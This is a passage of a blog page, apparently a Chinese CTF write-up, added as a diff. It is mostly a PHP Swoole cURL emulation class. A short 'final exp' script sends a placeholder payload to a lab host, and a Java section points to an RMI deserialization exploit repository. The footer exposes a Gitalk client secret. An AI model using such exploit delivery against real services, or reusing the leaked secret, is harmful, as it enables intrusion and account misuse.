+                break;
+            case CURLOPT_HEADERFUNCTION:
+                $this-&gt;headerFunction = $value;
+                break;
+            case CURLOPT_READFUNCTION:
+                $this-&gt;readFunction = $value;
+                break;
+            case CURLOPT_WRITEFUNCTION:
+                $this-&gt;writeFunction = $value;
+                break;
+            case CURLOPT_PROGRESSFUNCTION:
+                $this-&gt;progressFunction = $value;
+                break;
+            case CURLOPT_HTTPAUTH:
+                if (!($value &amp; CURLAUTH_BASIC)) {
+                    trigger_error(&quot;swoole_curl_setopt(): CURLOPT_HTTPAUTH[{$value}] is not supported&quot;, E_USER_WARNING);
+                    return false;
+                }
+                break;
+            case CURLOPT_USERPWD:
+                $this-&gt;setHeader('Authorization', 'Basic ' . base64_encode($value));
+                break;
+            case CURLOPT_FOLLOWLOCATION:
+                $this-&gt;followLocation = $value;
+                break;
+            case CURLOPT_AUTOREFERER:
+                $this-&gt;autoReferer = $value;
+                break;
+            case CURLOPT_MAXREDIRS:
+                $this-&gt;maxRedirects = $value;
+                break;
+            case CURLOPT_PUT:
+            case CURLOPT_UPLOAD:
+                /* after libcurl 7.12, CURLOPT_PUT is replaced by CURLOPT_UPLOAD */
+                $this-&gt;method = 'PUT';
+                break;
+            case CURLOPT_INFILE:
+                $this-&gt;infile = $value;
+                break;
+            case CURLOPT_INFILESIZE:
+                $this-&gt;infileSize = $value;
+                break;
+            case CURLOPT_HTTPGET:
+                /* Since GET is the default, this is only necessary if the request method has been changed. */
+                $this-&gt;method = 'GET';
+                break;
+            default:
+                throw new Swoole\Curl\Exception(&quot;swoole_curl_setopt(): option[{$opt}] is not supported&quot;);
+        }
+        return true;
+    }
+
+    private function execute()
+    {
+        $this-&gt;info['redirect_count'] = $this-&gt;info['starttransfer_time'] = 0;
+        $this-&gt;info['redirect_url'] = '';
+        $timeBegin = microtime(true);
+        /*
+         * Socket
+         */
+        if (!$this-&gt;urlInfo) {
+            $this-&gt;setError(CURLE_URL_MALFORMAT, 'No URL set or URL using bad/illegal format');
+            return false;
+        }
+        if (!$this-&gt;client) {
+            $this-&gt;create();
+        }
+        do {
+            $client = $this-&gt;client;
+            /*
+             * Http Proxy
+             */
+            if ($this-&gt;proxy) {
+                $parse = parse_url($this-&gt;proxy);
+                $proxy = $parse['host'] ?? $parse['path'];
+                $proxyPort = $parse['port'] ?? $this-&gt;proxyPort;
+                $proxyUsername = $parse['user'] ?? $this-&gt;proxyUsername;
+                $proxyPassword = $parse['pass'] ?? $this-&gt;proxyPassword;
+                $proxyType = $parse['scheme'] ?? $this-&gt;proxyType;
+                if (is_string($proxyType)) {
+                    if ($proxyType === 'socks5') {
+                        $proxyType = CURLPROXY_SOCKS5;
+                    } else {
+                        $proxyType = CURLPROXY_HTTP;
+                    }
+                }
+
+                if (!filter_var($proxy, FILTER_VALIDATE_IP)) {
+                    $ip = Swoole\Coroutine::gethostbyname($proxy, AF_INET, $this-&gt;clientOptions['connect_timeout'] ?? -1);
+                    if (!$ip) {
+                        $this-&gt;setError(CURLE_COULDNT_RESOLVE_PROXY, 'Could not resolve proxy: ' . $proxy);
+                        return false;
+                    }
+                    $this-&gt;proxy = $proxy = $ip;
+                }
+                switch ($proxyType) {
+                    case CURLPROXY_HTTP:
+                        $proxyOptions = [
+                            'http_proxy_host' =&gt; $proxy,
+                            'http_proxy_port' =&gt; $proxyPort,
+                            'http_proxy_username' =&gt; $proxyUsername,
+                            'http_proxy_password' =&gt; $proxyPassword,
+                        ];
+                        break;
+                    case CURLPROXY_SOCKS5:
+                        $proxyOptions = [
+                            'socks5_host' =&gt; $proxy,
+                            'socks5_port' =&gt; $proxyPort,
+                            'socks5_username' =&gt; $proxyUsername,
+                            'socks5_password' =&gt; $proxyPassword,
+                        ];
+                        break;
+                    default:
+                        throw new CurlException(&quot;Unexpected proxy type [{$proxyType}]&quot;);
+                }
+            }
+            /*
+             * Client Options
+             */
+            $client-&gt;set(
+                $this-&gt;clientOptions +
+                ($proxyOptions ?? [])
+            );
+            /*
+             * Method
+             */
+            if ($this-&gt;method) {
+                $client-&gt;setMethod($this-&gt;method);
+            }
+            /*
+             * Data
+             */
+            if ($this-&gt;infile) {
+                // Infile
+                // Notice: we make its priority higher than postData but raw cURL will send both of them
+                $data = '';
+                while (true) {
+                    $nLength = $this-&gt;infileSize - strlen($data);
+                    if ($nLength === 0) {
+                        break;
+                    }
+                    if (feof($this-&gt;infile)) {
+                        break;
+                    }
+                    $data .= fread($this-&gt;infile, $nLength);
+                }
+                $client-&gt;setData($data);
+                // Notice: although we reset it, raw cURL never do this
+                $this-&gt;infile = null;
+                $this-&gt;infileSize = PHP_INT_MAX;
+            } else {
+                // POST data
+                if ($this-&gt;postData) {
+                    if (is_string($this-&gt;postData)) {
+                        if (!$this-&gt;hasHeader('content-type')) {
+                            $this-&gt;setHeader('Content-Type', 'application/x-www-form-urlencoded');
+                        }
+                    } elseif (is_array($this-&gt;postData)) {
+                        foreach ($this-&gt;postData as $k =&gt; $v) {
+                            if ($v instanceof CURLFile) {
+                                $client-&gt;addFile($v-&gt;getFilename(), $k, $v-&gt;getMimeType() ?: 'application/octet-stream', $v-&gt;getPostFilename());
+                                unset($this-&gt;postData[$k]);
+                            }
+                        }
+                    }
+                }
+                $client-&gt;setData($this-&gt;postData);
+            }
+            /*
+             * Headers
+             */
+            // Notice: setHeaders must be placed last, because headers may be changed by other parts
+            // As much as possible to ensure that Host is the first header.
+            // See: http://tools.ietf.org/html/rfc7230#section-5.4
+            $client-&gt;setHeaders($this-&gt;headers);
+            /**
+             * Execute.
+             */
+            $executeResult = $client-&gt;execute($this-&gt;getUrl());
+            if (!$executeResult) {
+                $errCode = $client-&gt;errCode;
+                if ($errCode == SWOOLE_ERROR_DNSLOOKUP_RESOLVE_FAILED or $errCode == SWOOLE_ERROR_DNSLOOKUP_RESOLVE_TIMEOUT) {
+                    $this-&gt;setError(CURLE_COULDNT_RESOLVE_HOST, 'Could not resolve host: ' . $client-&gt;host);
+                } else {
+                    $this-&gt;setError($errCode, $client-&gt;errMsg);
+                }
+                $this-&gt;info['total_time'] = microtime(true) - $timeBegin;
+                return false;
+            }
+            if ($client-&gt;statusCode &gt;= 300 and $client-&gt;statusCode &lt; 400 and isset($client-&gt;headers['location'])) {
+                $redirectParsedUrl = $this-&gt;getRedirectUrl($client-&gt;headers['location']);
+                $redirectUrl = static::unparseUrl($redirectParsedUrl);
+                if ($this-&gt;followLocation and ($this-&gt;maxRedirects === null or $this-&gt;info['redirect_count'] &lt; $this-&gt;maxRedirects)) {
+                    if ($this-&gt;info['redirect_count'] === 0) {
+                        $this-&gt;info['starttransfer_time'] = microtime(true) - $timeBegin;
+                        $redirectBeginTime = microtime(true);
+                    }
+                    // force GET
+                    if (in_array($client-&gt;statusCode, [Status::MOVED_PERMANENTLY, Status::FOUND, Status::SEE_OTHER])) {
+                        $this-&gt;method = 'GET';
+                    }
+                    if ($this-&gt;autoReferer) {
+                        $this-&gt;setHeader('Referer', $this-&gt;info['url']);
+                    }
+                    $this-&gt;setUrl($redirectUrl, false);
+                    $this-&gt;setUrlInfo($redirectParsedUrl);
+                    $this-&gt;info['redirect_count']++;
+                } else {
+                    $this-&gt;info['redirect_url'] = $redirectUrl;
+                    break;
+                }
+            } elseif ($this-&gt;failOnError &amp;&amp; $client-&gt;statusCode &gt;= 400) {
+                $this-&gt;setError(CURLE_HTTP_RETURNED_ERROR, &quot;The requested URL returned error: {$client-&gt;statusCode} &quot; . Status::getReasonPhrase($client-&gt;statusCode));
+                return false;
+            } else {
+                break;
+            }
+        } while (true);
+        $this-&gt;info['total_time'] = microtime(true) - $timeBegin;
+        $this-&gt;info['http_code'] = $client-&gt;statusCode;
+        $this-&gt;info['content_type'] = $client-&gt;headers['content-type'] ?? '';
+        $this-&gt;info['size_download'] = $this-&gt;info['download_content_length'] = strlen($client-&gt;body);
+        $this-&gt;info['speed_download'] = 1 / $this-&gt;info['total_time'] * $this-&gt;info['size_download'];
+        if (isset($redirectBeginTime)) {
+            $this-&gt;info['redirect_time'] = microtime(true) - $redirectBeginTime;
+        }
+
+        $headerContent = '';
+        if ($client-&gt;headers) {
+            $cb = $this-&gt;headerFunction;
+            if ($client-&gt;statusCode &gt; 0) {
+                $row = &quot;HTTP/1.1 {$client-&gt;statusCode} &quot; . Status::getReasonPhrase($client-&gt;statusCode) . &quot;\r\n&quot;;
+                if ($cb) {
+                    $cb($this, $row);
+                }
+                $headerContent .= $row;
+            }
+            foreach ($client-&gt;headers as $k =&gt; $v) {
+                $row = &quot;{$k}: {$v}\r\n&quot;;
+                if ($cb) {
+                    $cb($this, $row);
+                }
+                $headerContent .= $row;
+            }
+            $headerContent .= &quot;\r\n&quot;;
+            $this-&gt;info['header_size'] = strlen($headerContent);
+            if ($cb) {
+                $cb($this, '');
+            }
+        } else {
+            $this-&gt;info['header_size'] = 0;
+        }
+
+        if ($client-&gt;body and $this-&gt;readFunction) {
+            $cb = $this-&gt;readFunction;
+            $cb($this, $this-&gt;outputStream, strlen($client-&gt;body));
+        }
+
+        if ($this-&gt;withHeader) {
+            $transfer = $headerContent . $client-&gt;body;
+        } else {
+            $transfer = $client-&gt;body;
+        }
+
+        if ($this-&gt;withHeaderOut) {
+            $headerOutContent = $client-&gt;getHeaderOut();
+            $this-&gt;info['request_header'] = $headerOutContent ? $headerOutContent . &quot;\r\n\r\n&quot; : '';
+        }
+        if ($this-&gt;withFileTime) {
+            if (isset($client-&gt;headers['last-modified'])) {
+                $this-&gt;info['filetime'] = strtotime($client-&gt;headers['last-modified']);
+            } else {
+                $this-&gt;info['filetime'] = -1;
+            }
+        }
+
+        if ($this-&gt;cookieJar &amp;&amp; $this-&gt;cookieJar !== '') {
+            if ($this-&gt;cookieJar === '-') {
+                foreach ((array) $client-&gt;set_cookie_headers as $cookie) {
+                    echo $cookie . PHP_EOL;
+                }
+            } else {
+                $cookies = '';
+                foreach ((array) $client-&gt;set_cookie_headers as $cookie) {
+                    $cookies .= &quot;{$cookie};&quot;;
+                }
+                file_put_contents($this-&gt;cookieJar, $cookies);
+            }
+        }
+
+        if ($this-&gt;writeFunction) {
+            if (!is_callable($this-&gt;writeFunction)) {
+                trigger_error('curl_exec(): Could not call the CURLOPT_WRITEFUNCTION', E_USER_WARNING);
+                $this-&gt;setError(CURLE_WRITE_ERROR, 'Failure writing output to destination');
+                return false;
+            }
+            call_user_func($this-&gt;writeFunction, $this, $transfer);
+            return true;
+        }
+
+        if ($this-&gt;returnTransfer) {
+            return $this-&gt;transfer = $transfer;
+        }
+        if ($this-&gt;outputStream) {
+            return fwrite($this-&gt;outputStream, $transfer) === strlen($transfer);
+        }
+        echo $transfer;
+
+        return true;
+    }
+
+    /* ====== Redirect helper ====== */
+
+    private static function unparseUrl(array $parsedUrl): string
+    {
+        $scheme = ($parsedUrl['scheme'] ?? 'http') . '://';
+        $host = $parsedUrl['host'] ?? '';
+        $port = isset($parsedUrl['port']) ? ':' . $parsedUrl['port'] : '';
+        $user = $parsedUrl['user'] ?? '';
+        $pass = isset($parsedUrl['pass']) ? ':' . $parsedUrl['pass'] : '';
+        $pass = ($user or $pass) ? &quot;{$pass}@&quot; : '';
+        $path = $parsedUrl['path'] ?? '';
+        $query = (isset($parsedUrl['query']) and $parsedUrl['query'] !== '') ? '?' . $parsedUrl['query'] : '';
+        $fragment = isset($parsedUrl['fragment']) ? '#' . $parsedUrl['fragment'] : '';
+        return $scheme . $user . $pass . $host . $port . $path . $query . $fragment;
+    }
+
+    private function getRedirectUrl(string $location): array
+    {
+        $uri = parse_url($location);
+        if (isset($uri['host'])) {
+            $redirectUri = $uri;
+        } else {
+            if (!isset($location[0])) {
+                return [];
+            }
+            $redirectUri = $this-&gt;urlInfo;
+            $redirectUri['query'] = '';
+            if ($location[0] === '/') {
+                $redirectUri['path'] = $location;
+            } else {
+                $path = dirname($redirectUri['path'] ?? '');
+                if ($path === '.') {
+                    $path = '/';
+                }
+                if (isset($location[1]) and substr($location, 0, 2) === './') {
+                    $location = substr($location, 2);
+                }
+                $redirectUri['path'] = $path . $location;
+            }
+            if (is_array($uri)) {
+                foreach ($uri as $k =&gt; $v) {
+                    if (!in_array($k, ['path', 'query'])) {
+                        $redirectUri[$k] = $v;
+                    }
+                }
+            }
+        }
+        return $redirectUri;
+    }
+}
+</code></pre>
+<p>最终exp：</p>
+<pre><code>&lt;?php
+$ip='172.18.0.2';
+$port=8080;
+include_once __DIR__ . &quot;/Calculator.php&quot;;
+$data=urldecode('payloadpayload');
+$client = new Swoole\Client(SWOOLE_SOCK_TCP);
+if (!$client-&gt;connect($ip, $port, -1)) {
+    exit(&quot;connect failed. Error: {$client-&gt;errCode}\n&quot;);
+}
+$client-&gt;send($data);
+echo $client-&gt;recv();
+$client-&gt;close();
+</code></pre>
+<h1 id="java部分">Java部分</h1>
+<p>java 8u221的rmi<br>
+复现就完事了<code>https://github.com/lalajun/RMIDeserialize</code></p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/o7CJqUnTn/">
+              <span class="post-title">
+                AntCTF x D^3CTF non RCE?&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
